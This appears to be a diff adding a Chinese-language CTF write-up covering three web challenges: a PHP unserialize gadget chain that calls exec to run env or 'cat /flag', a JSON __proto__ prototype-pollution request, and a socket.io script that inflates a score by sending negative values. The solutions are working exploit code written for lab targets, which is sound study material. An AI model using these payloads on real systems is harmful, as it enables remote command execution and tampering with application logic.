+<li><strong>反弹Shell</strong>：攻击者可以通过反弹Shell获取服务器的控制权，进一步进行渗透攻击。</li>
+<li><strong>控制整个服务器</strong>：攻击者可以完全控制服务器，执行任意操作。</li>
+</ol>
+<h2 id="19-第十九章-revenge"><a href="#19-第十九章-revenge" class="headerlink" title="19 第十九章_revenge"></a>19 第十九章_revenge</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br></pre></td><td class="code"><pre><span class="line"> &lt;?php</span><br><span class="line">highlight_file(__FILE__);</span><br><span class="line"></span><br><span class="line">class Person</span><br><span class="line">&#123;</span><br><span class="line">    public $name;</span><br><span class="line">    public $id;</span><br><span class="line">    public $age;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">class PersonA extends Person</span><br><span class="line">&#123;</span><br><span class="line">    public function __destruct()</span><br><span class="line">    &#123;</span><br><span class="line">        $name = $this-&gt;name;</span><br><span class="line">        $id = $this-&gt;id;</span><br><span class="line">        $name-&gt;$id($this-&gt;age);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">class PersonB extends Person</span><br><span class="line">&#123;</span><br><span class="line">    public function __set($key, $value)</span><br><span class="line">    &#123;</span><br><span class="line">        $this-&gt;name = $value;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    public function __invoke($id)</span><br><span class="line">    &#123;</span><br><span class="line">        $name = $this-&gt;id;</span><br><span class="line">        $name-&gt;name = $id;</span><br><span class="line">        $name-&gt;age = $this-&gt;name;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">class PersonC extends Person</span><br><span class="line">&#123;</span><br><span class="line">    public function check($age)</span><br><span class="line">    &#123;</span><br><span class="line">        $name=$this-&gt;name;</span><br><span class="line">        if($age == null)</span><br><span class="line">        &#123;</span><br><span class="line">            die(&quot;Age can&#x27;t be empty.&quot;);</span><br><span class="line">        &#125;</span><br><span class="line">        else if($name === &quot;system&quot;)</span><br><span class="line">        &#123;</span><br><span class="line">            die(&quot;Hacker!&quot;);</span><br><span class="line">        &#125;</span><br><span class="line">        else</span><br><span class="line">        &#123;</span><br><span class="line">            var_dump($name($age));</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    public function __wakeup()</span><br><span class="line">    &#123;</span><br><span class="line">        $name = $this-&gt;id;</span><br><span class="line">        $name-&gt;age = $this-&gt;age;</span><br><span class="line">        $name($this);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">if(isset($_GET[&#x27;person&#x27;]))</span><br><span class="line">&#123;</span><br><span class="line">    $person = unserialize($_GET[&#x27;person&#x27;]);</span><br><span class="line">&#125; </span><br></pre></td></tr></table></figure>
+
+<p>禁用system，换exec</p>
+<p>1.<code>exec</code>是 PHP 里用来<strong>执行系统命令</strong>的函数，和你之前想用到的<code>system</code>功能几乎一样</p>
+<ol start="2">
+<li></li>
+</ol>
+<h3 id="核心思路"><a href="#核心思路" class="headerlink" title="核心思路"></a>核心思路</h3><p>代码有自动执行链，避开禁用的 system 改用 exec，不用读文件而是查环境变量，让 A&#x2F;B&#x2F;C 互相指向触发执行，就能拿到 flag。</p>
+<ol>
+<li><strong>找链条</strong>：代码里 C→B→A→C 会自动跑一遍，最后到 C 执行命令；</li>
+<li><strong>绕限制</strong>：system 不能用就用 exec，flag 不在文件里就用 env 查环境变量；</li>
+<li><strong>拼 Payload</strong>：让 A&#x2F;B&#x2F;C 互相指向，传 exec 和 env，跑通链条就拿到 flag。</li>
+</ol>
+<h3 id=""><a href="#" class="headerlink" title=""></a></h3><p>哎，抄答案吧，代审太难了，根本不理解</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="comment">// 1. 仅保留必要类定义（去掉冗余空行/注释，保留核心方法）</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Person</span> </span>&#123; <span class="keyword">public</span> <span class="variable">$name</span>; <span class="keyword">public</span> <span class="variable">$id</span>; <span class="keyword">public</span> <span class="variable">$age</span>; &#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">PersonA</span> <span class="keyword">extends</span> <span class="title">Person</span> </span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        <span class="variable">$name</span> = <span class="variable language_">$this</span>-&gt;name;</span><br><span class="line">        <span class="variable">$id</span> = <span class="variable language_">$this</span>-&gt;id;</span><br><span class="line">        <span class="variable">$name</span>-&gt;<span class="variable">$id</span>(<span class="variable language_">$this</span>-&gt;age); <span class="comment">// 核心：调用C的check方法</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">PersonB</span> <span class="keyword">extends</span> <span class="title">Person</span> </span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__set</span>(<span class="params"><span class="variable">$key</span>, <span class="variable">$value</span></span>) </span>&#123; <span class="variable language_">$this</span>-&gt;name = <span class="variable">$value</span>; &#125; <span class="comment">// 保留__set（虽未用到，但不删）</span></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__invoke</span>(<span class="params"><span class="variable">$id</span></span>) </span>&#123;</span><br><span class="line">        <span class="variable">$name</span> = <span class="variable language_">$this</span>-&gt;id;</span><br><span class="line">        <span class="variable">$name</span>-&gt;name = <span class="variable">$id</span>;     <span class="comment">// 给C的name赋值</span></span><br><span class="line">        <span class="variable">$name</span>-&gt;age = <span class="variable language_">$this</span>-&gt;name;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">PersonC</span> <span class="keyword">extends</span> <span class="title">Person</span> </span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">check</span>(<span class="params"><span class="variable">$age</span></span>) </span>&#123;</span><br><span class="line">        <span class="variable">$name</span> = <span class="variable language_">$this</span>-&gt;name;</span><br><span class="line">        <span class="keyword">if</span> (<span class="variable">$age</span> == <span class="literal">null</span>) <span class="keyword">die</span>(<span class="string">&quot;Age can&#x27;t be empty.&quot;</span>);</span><br><span class="line">        <span class="keyword">elseif</span> (<span class="variable">$name</span> === <span class="string">&quot;system&quot;</span>) <span class="keyword">die</span>(<span class="string">&quot;Hacker!&quot;</span>);</span><br><span class="line">        <span class="keyword">else</span> <span class="title function_ invoke__">var_dump</span>(<span class="variable">$name</span>(<span class="variable">$age</span>)); <span class="comment">// 执行命令</span></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__wakeup</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        <span class="variable">$name</span> = <span class="variable language_">$this</span>-&gt;id;</span><br><span class="line">        <span class="variable">$name</span>-&gt;age = <span class="variable language_">$this</span>-&gt;age;</span><br><span class="line">        <span class="variable">$name</span>(<span class="variable language_">$this</span>); <span class="comment">// 触发B的__invoke</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 2. 精简Payload构造逻辑（修复$d未定义错误，保留核心赋值）</span></span><br><span class="line"><span class="variable">$personB_object</span> = <span class="keyword">new</span> <span class="title function_ invoke__">PersonB</span>();</span><br><span class="line"><span class="variable">$personC_object</span> = <span class="keyword">new</span> <span class="title function_ invoke__">PersonC</span>();</span><br><span class="line"><span class="variable">$personA_object</span> = <span class="keyword">new</span> <span class="title function_ invoke__">PersonA</span>();</span><br><span class="line"></span><br><span class="line"><span class="comment">// 核心赋值（触发链：C-&gt;B-&gt;A-&gt;C）</span></span><br><span class="line"><span class="variable">$personB_object</span>-&gt;id = <span class="variable">$personC_object</span>; <span class="comment">// B的id指向C</span></span><br><span class="line"><span class="variable">$personC_object</span>-&gt;name = <span class="string">&quot;exec&quot;</span>;        <span class="comment">// 用exec替代system，绕开拦截</span></span><br><span class="line"><span class="variable">$personC_object</span>-&gt;id = <span class="variable">$personB_object</span>; <span class="comment">// C的id指向B</span></span><br><span class="line"><span class="variable">$personC_object</span>-&gt;age = <span class="string">&quot;env&quot;</span>;          <span class="comment">// 执行env命令（可替换为cat /flag）</span></span><br><span class="line"><span class="variable">$personA_object</span>-&gt;name = <span class="variable">$personC_object</span>; <span class="comment">// A的name指向C</span></span><br><span class="line"><span class="variable">$personA_object</span>-&gt;id = <span class="string">&quot;check&quot;</span>;         <span class="comment">// 调用C的check方法</span></span><br><span class="line"><span class="variable">$personA_object</span>-&gt;age = <span class="string">&quot;env&quot;</span>;          <span class="comment">// 命令参数</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// 3. 输出URL编码后的序列化字符串（直接用）</span></span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">urlencode</span>(<span class="title function_ invoke__">serialize</span>(<span class="variable">$personA_object</span>));</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+
+
+
+
+
+
+
+
+
+
+<h2 id="mini-l-ctf-web-Clickclick"><a href="#mini-l-ctf-web-Clickclick" class="headerlink" title="mini-l ctf web Clickclick"></a>mini-l ctf web Clickclick</h2><p>抓包详细：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">POST /update-amount HTTP/1.1</span><br><span class="line">Host: 127.0.0.1:35023</span><br><span class="line">略</span><br><span class="line"></span><br><span class="line">&#123;&quot;type&quot;:&quot;set&quot;,&quot;point&quot;:&#123;&quot;amount&quot;:null&#125;&#125;</span><br></pre></td></tr></table></figure>
+
+
+
+
+
+
+
+<p>不就是点击一百次吗？</p>
+<p>来个脚本：</p>
+<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">let</span> button = <span class="variable language_">document</span>.<span class="title function_">querySelector</span>(<span class="string">&#x27;button&#x27;</span>)</span><br><span class="line"><span class="keyword">for</span> (<span class="keyword">let</span> i = <span class="number">0</span>; i &lt; <span class="number">10000</span>; i++) &#123; button.<span class="title function_">click</span>(); &#125;</span><br></pre></td></tr></table></figure>
+
+<p>回应：</p>
+<p>Click 10000 times, and something appear.</p>
+<p>什么叫“前后端分离”啊？（战术后仰）</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">if ( req.body.point.amount == 0 || req.body.point.amount == null) &#123; delete req.body.point.amount &#125;</span><br><span class="line">    </span><br></pre></td></tr></table></figure>
+
+
+
+
+
+<p>所以我们可以利用这个漏洞：把amount的值改成0，这样它就会被删除，然后我们再向他祖宗point悄悄塞进去一万</p>
+<ol>
+<li><code>__proto__</code> <strong>指向这个对象的 “原型（祖宗）”</strong>。比如你创建一个空对象 <code>const point = {}</code>，<code>point.__proto__</code> 就指向所有对象的 “公共祖宗”（Object.prototype）。</li>
+</ol>
+<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 1. 发送请求到指定接口（这道题是 /update-amount ）</span></span><br><span class="line"><span class="title function_">fetch</span>(<span class="string">&#x27;/update-amount&#x27;</span>, &#123;  <span class="comment">//就是这里需要改成按钮相关信息网页</span></span><br><span class="line">  <span class="comment">// 2. 请求方式（固定POST，不用改）</span></span><br><span class="line">  <span class="attr">method</span>: <span class="string">&#x27;POST&#x27;</span>,</span><br><span class="line">  <span class="comment">// 3. 告诉后端传的是JSON格式（固定，不用改）</span></span><br><span class="line">  <span class="attr">headers</span>: &#123; <span class="string">&#x27;Content-Type&#x27;</span>: <span class="string">&#x27;application/json&#x27;</span> &#125;,</span><br><span class="line">  <span class="comment">// 4. 核心污染数据（固定，不用改）</span></span><br><span class="line">  <span class="attr">body</span>: <span class="title class_">JSON</span>.<span class="title function_">stringify</span>(&#123;</span><br><span class="line">    <span class="string">&quot;type&quot;</span>: <span class="string">&quot;set&quot;</span>,</span><br><span class="line">    <span class="string">&quot;point&quot;</span>: &#123;</span><br><span class="line">      <span class="string">&quot;amount&quot;</span>: <span class="literal">null</span>,</span><br><span class="line">      <span class="string">&quot;__proto__&quot;</span>: &#123;</span><br><span class="line">        <span class="string">&quot;amount&quot;</span>: <span class="number">10000</span></span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;)</span><br><span class="line">&#125;)</span><br><span class="line"><span class="comment">// 5. 请求成功后，弹窗显示结果（固定，不用改）</span></span><br><span class="line">.<span class="title function_">then</span>(<span class="function"><span class="params">r</span> =&gt;</span> r.<span class="title function_">text</span>())</span><br><span class="line">.<span class="title function_">then</span>(<span class="function"><span class="params">res</span> =&gt;</span> <span class="title function_">alert</span>(<span class="string">&quot;返回结果：&quot;</span> + res))</span><br><span class="line"><span class="comment">// 6. 请求失败后，弹窗显示错误（固定，不用改）</span></span><br><span class="line">.<span class="title function_">catch</span>(<span class="function"><span class="params">err</span> =&gt;</span> <span class="title function_">alert</span>(<span class="string">&quot;出错了：&quot;</span> + err));</span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+
+
+
+
+
+
+<h2 id="GuessOneGuess"><a href="#GuessOneGuess" class="headerlink" title="GuessOneGuess"></a>GuessOneGuess</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br></pre></td><td class="code"><pre><span class="line">module.exports = function(io) &#123;</span><br><span class="line">    io.on(&#x27;connection&#x27;, (socket) =&gt; &#123;</span><br><span class="line">        let targetNumber = Math.floor(Math.random() * 100) + 1;</span><br><span class="line">        let guessCount = 0;</span><br><span class="line">        let totalScore = 0;</span><br><span class="line">        const FLAG = process.env.FLAG || &quot;miniL&#123;THIS_IS_THE_FLAG&#125;&quot;;</span><br><span class="line">        console.log(`新连接 - 目标数字: $&#123;targetNumber&#125;`);</span><br><span class="line"></span><br><span class="line">    </span><br><span class="line">        socket.emit(&#x27;game-message&#x27;, &#123;</span><br><span class="line">            type: &#x27;welcome&#x27;,</span><br><span class="line">            message: &#x27;猜一个1-100之间的数字！&#x27;,</span><br><span class="line">            score: totalScore</span><br><span class="line">        &#125;);</span><br><span class="line"></span><br><span class="line">        </span><br><span class="line">        socket.on(&#x27;guess&#x27;, (data) =&gt; &#123;</span><br><span class="line">            try &#123;</span><br><span class="line">              console.log(totalScore);</span><br><span class="line">                const guess = parseInt(data.value);</span><br><span class="line"></span><br><span class="line">                if (isNaN(guess)) &#123;</span><br><span class="line">                    throw new Error(&#x27;请输入有效数字&#x27;);</span><br><span class="line">                &#125;</span><br><span class="line"></span><br><span class="line">                if (guess &lt; 1 || guess &gt; 100) &#123;</span><br><span class="line">                    throw new Error(&#x27;请输入1-100之间的数字&#x27;);</span><br><span class="line">                &#125;</span><br><span class="line"></span><br><span class="line">                guessCount++;</span><br><span class="line"></span><br><span class="line">                if (guess === targetNumber) &#123;</span><br><span class="line">                   </span><br><span class="line">                    const currentScore = Math.floor(100 / Math.pow(2, guessCount - 1));</span><br><span class="line">                    totalScore += currentScore;</span><br><span class="line"></span><br><span class="line">                    let message = `🎉 猜对了！得分 +$&#123;currentScore&#125; (总分数: $&#123;totalScore&#125;)`;</span><br><span class="line">                    let showFlag = false;</span><br><span class="line"></span><br><span class="line">                    if (totalScore &gt; 1.7976931348623157e308) &#123;</span><br><span class="line">                        message += `\n🏴 $&#123;FLAG&#125;`;</span><br><span class="line">                        showFlag = true;</span><br><span class="line">                    &#125;</span><br><span class="line"></span><br><span class="line">                    socket.emit(&#x27;game-message&#x27;, &#123;</span><br><span class="line">                        type: &#x27;result&#x27;,</span><br><span class="line">                        win: true,</span><br><span class="line">                        message: message,</span><br><span class="line">                        score: totalScore,</span><br><span class="line">                        showFlag: showFlag,</span><br><span class="line">                        currentScore: currentScore</span><br><span class="line">                    &#125;);</span><br><span class="line"></span><br><span class="line">                    </span><br><span class="line">                    targetNumber = Math.floor(Math.random() * 100) + 1;</span><br><span class="line">                    console.log(`新目标数字: $&#123;targetNumber&#125;`);</span><br><span class="line">                    guessCount = 0;</span><br><span class="line">                &#125; else &#123;</span><br><span class="line">                    if (guessCount &gt;= 100) &#123;</span><br><span class="line">                      console.log(&quot;100次未猜中！将扣除当前分数并重置&quot;);</span><br><span class="line">                        socket.emit(&#x27;punishment&#x27;, &#123;</span><br><span class="line">                            message: &quot;100次未猜中！将扣除当前分数并重置&quot;,</span><br><span class="line">                        &#125;);</span><br><span class="line">                        return;</span><br><span class="line">                    &#125;</span><br><span class="line">                    socket.emit(&#x27;game-message&#x27;, &#123;</span><br><span class="line">                        type: &#x27;result&#x27;,</span><br><span class="line">                        win: false,</span><br><span class="line">                        message: guess &lt; targetNumber ? &#x27;太小了！&#x27; : &#x27;太大了！&#x27;,</span><br><span class="line">                        score: totalScore</span><br><span class="line">                    &#125;);</span><br><span class="line">                &#125;</span><br><span class="line">            &#125; catch (err) &#123;</span><br><span class="line">                socket.emit(&#x27;game-message&#x27;, &#123;</span><br><span class="line">                    type: &#x27;error&#x27;,</span><br><span class="line">                    message: err.message,</span><br><span class="line">                    score: totalScore</span><br><span class="line">                &#125;);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;);</span><br><span class="line">        socket.on(&#x27;punishment-response&#x27;, (data) =&gt; &#123;</span><br><span class="line">          totalScore -= data.score;</span><br><span class="line">          guessCount = 0;</span><br><span class="line">          targetNumber = Math.floor(Math.random() * 100) + 1;</span><br><span class="line">          console.log(`新目标数字: $&#123;targetNumber&#125;`);</span><br><span class="line">          socket.emit(&#x27;game-message&#x27;, &#123;</span><br><span class="line">            type: &#x27;result&#x27;,</span><br><span class="line">            win: true,</span><br><span class="line">            message: &quot;扣除分数并重置&quot;,</span><br><span class="line">            score: totalScore,</span><br><span class="line">            showFlag: false,</span><br><span class="line">          &#125;);</span><br><span class="line"></span><br><span class="line">        &#125;);</span><br><span class="line">    &#125;);</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>
+
+
+
+
+
+<p>看关键，showflag一直是false，只有：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">if (totalScore &gt; 1.7976931348623157e308) &#123;</span><br><span class="line">                        message += `\n🏴 $&#123;FLAG&#125;`;</span><br><span class="line">                        showFlag = true;</span><br></pre></td></tr></table></figure>
+
+<p>得分大于这个恶心的数字时才为true</p>
+<p>JS 最大正常数：<code>1.7976931348623157e308</code>（记为「最大值」）；</p>
+<p>但是规则有点不一样：</p>
+<ol>
+<li>加分规则：猜中才加分，但单次得分少，靠正常猜永远到不了目标分数；</li>
+</ol>
+<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> currentScore = <span class="title class_">Math</span>.<span class="title function_">floor</span>(<span class="number">100</span> / <span class="title class_">Math</span>.<span class="title function_">pow</span>(<span class="number">2</span>, guessCount - <span class="number">1</span>));</span><br></pre></td></tr></table></figure>
+
+<ul>
+<li>人话翻译：<ul>
+<li><code>guessCount</code> &#x3D; 你猜中数字前的「总猜测次数」（比如 1 次猜中，次数就是 1；5 次猜中，次数就是 5）；</li>
+<li><code>Math.pow(2, n)</code> &#x3D; 2 的 n 次方（比如 2¹&#x3D;2，2³&#x3D;8）；</li>
+<li><code>Math.floor()</code> &#x3D; 向下取整（只保留整数，比如 31.2→31）；</li>
+<li>最终得分 &#x3D; 100 ÷ (2 的「猜中次数 - 1」次方)，再取整。</li>
+</ul>
+</li>
+</ul>
+<table>
+<thead>
+<tr>
+<th>猜中次数</th>
+<th>计算过程</th>
+<th>本次得分</th>
+<th>总分（假设初始 0）</th>
+</tr>
+</thead>
+<tbody><tr>
+<td>1 次猜中</td>
+<td>100 ÷ (2⁰) &#x3D; 100 ÷ 1</td>
+<td>100</td>
+<td>100</td>
+</tr>
+<tr>
+<td>2 次猜中</td>
+<td>100 ÷ (2¹) &#x3D; 100 ÷ 2</td>
+<td>50</td>
+<td>50</td>
+</tr>
+<tr>
+<td>3 次猜中</td>
+<td>100 ÷ (2²) &#x3D; 100 ÷ 4</td>
+<td>25</td>
+<td>25</td>
+</tr>
+<tr>
+<td>4 次猜中</td>
+<td>100 ÷ (2³) &#x3D; 100 ÷ 8</td>
+<td>12</td>
+<td>12（100&#x2F;8&#x3D;12.5→取整 12）</td>
+</tr>
+<tr>
+<td>5 次猜中</td>
+<td>100 ÷ (2⁴) &#x3D; 100 ÷ 16</td>
+<td>6</td>
+<td>6（100&#x2F;16&#x3D;6.25→取整 6）</td>
+</tr>
+<tr>
+<td>10 次猜中</td>
+<td>100 ÷ (2⁹) &#x3D; 100 ÷ 512</td>
+<td>0</td>
+<td>0（100&#x2F;512≈0.19→取整 0）</td>
+</tr>
+</tbody></table>
+<ol>
+<li>扣分漏洞：传负数让 “扣分” 变 “加分”，多次传就能让总分变成无穷大；</li>
+</ol>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">socket.on(&#x27;punishment-response&#x27;, (data) =&gt; &#123;</span><br><span class="line">          totalScore -= data.score;</span><br></pre></td></tr></table></figure>
+
+
+
+<p>那就穿个负数进去，多穿几个不久很大了吗</p>
+<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 极简版 - 分行格式（核心逻辑不变）</span></span><br><span class="line"><span class="keyword">const</span> s = <span class="title function_">io</span>();</span><br><span class="line"></span><br><span class="line"><span class="comment">// 1. 刷无穷大总分（10次足够）</span></span><br><span class="line"><span class="keyword">for</span>(<span class="keyword">let</span> i=<span class="number">0</span>; i&lt;<span class="number">10</span>; i++) &#123;</span><br><span class="line">  s.<span class="title function_">emit</span>(<span class="string">&#x27;punishment-response&#x27;</span>, &#123; <span class="attr">score</span>: -<span class="number">1.5e308</span> &#125;);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 2. 自动猜1-100所有数字</span></span><br><span class="line"><span class="keyword">for</span>(<span class="keyword">let</span> n=<span class="number">1</span>; n&lt;=<span class="number">100</span>; n++) &#123;</span><br><span class="line">  s.<span class="title function_">emit</span>(<span class="string">&#x27;guess&#x27;</span>, &#123; <span class="attr">value</span>: n &#125;);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 3. 抓到flag就弹窗</span></span><br><span class="line">s.<span class="title function_">on</span>(<span class="string">&#x27;game-message&#x27;</span>, <span class="function"><span class="params">d</span> =&gt;</span> &#123;</span><br><span class="line">  <span class="keyword">if</span>(d.<span class="property">message</span>?.<span class="title function_">includes</span>(<span class="string">&#x27;miniL&#x27;</span>)) <span class="title function_">alert</span>(d.<span class="property">message</span>);</span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure>
+
+
+
+
+
+
+
